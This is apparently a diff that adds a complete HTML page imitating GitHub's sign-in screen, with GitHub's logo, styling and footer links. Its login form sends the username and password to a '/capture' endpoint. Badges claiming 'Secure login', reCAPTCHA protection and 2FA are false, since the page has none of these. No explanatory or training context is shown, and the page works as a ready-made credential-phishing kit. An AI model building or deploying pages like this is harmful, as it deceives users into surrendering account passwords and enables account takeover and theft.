@@ -1,0 +1,211 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to GitHub · GitHub</title>
+    <link rel="icon" href="https://github.com/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif; }
+        
+        body {
+            background: #0d1117;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            padding: 32px 0 24px;
+            text-align: center;
+        }
+        
+        .logo svg { fill: #fff; width: 48px; height: 48px; }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0 16px 80px;
+        }
+        
+        .auth-box {
+            width: 100%;
+            max-width: 340px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            letter-spacing: -0.5px;
+            color: #f0f6fc;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+        }
+        
+        .form-group { margin-bottom: 16px; }
+        
+        .form-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        label {
+            color: #c9d1d9;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        
+        .forgot {
+            color: #2f81f7;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .forgot:hover { text-decoration: underline; }
+        
+        input {
+            width: 100%;
+            padding: 5px 12px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: #f0f6fc;
+            font-size: 14px;
+            line-height: 20px;
+            min-height: 32px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #2f81f7;
+            box-shadow: 0 0 0 3px rgba(47,129,247,0.3);
+        }
+        
+        .btn-primary {
+            width: 100%;
+            background: #238636;
+            color: #fff;
+            border: 1px solid rgba(240,246,252,0.1);
+            border-radius: 6px;
+            padding: 5px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            line-height: 20px;
+            margin-top: 8px;
+        }
+        .btn-primary:hover { background: #2ea043; }
+        
+        .create-account {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px 20px;
+            text-align: center;
+            margin-top: 16px;
+            color: #c9d1d9;
+            font-size: 14px;
+        }
+        .create-account a {
+            color: #2f81f7;
+            text-decoration: none;
+        }
+        .create-account a:hover { text-decoration: underline; }
+        
+        .security-features {
+            margin-top: 60px;
+            text-align: center;
+        }
+        .security-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #8b949e;
+            font-size: 12px;
+            margin: 0 16px;
+        }
+        
+        footer {
+            padding: 40px 16px;
+            text-align: center;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            list-style: none;
+        }
+        .footer-links a {
+            color: #8b949e;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .footer-links a:hover { color: #2f81f7; text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <svg height="48" viewBox="0 0 16 16" version="1.1" width="48">
+                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+            </svg>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="auth-box">
+            <h1>Sign in to GitHub</h1>
+            
+            <div class="card">
+                <form action="/capture" method="POST">
+                    <div class="form-group">
+                        <label>Username or email address</label>
+                        <input type="text" name="username" required autofocus>
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="form-header">
+                            <label>Password</label>
+                            <a href="#" class="forgot">Forgot password?</a>
+                        </div>
+                        <input type="password" name="password" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary">Sign in</button>
+                </form>
+            </div>
+            
+            <div class="create-account">
+                New to GitHub? <a href="#">Create an account</a>
+            </div>
+            
+            <div class="security-features">
+                <span class="security-item">🔒 Secure login</span>
+                <span class="security-item">🛡️ Protected by reCAPTCHA</span>
+                <span class="security-item">🔑 2FA Available</span>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Docs</a></li>
+            <li><a href="#">Contact GitHub Support</a></li>
+            <li><a href="#">Manage cookies</a></li>
+            <li><a href="#">Do not share my personal information</a></li>
+        </ul>
+    </footer>
+</body>
+</html>
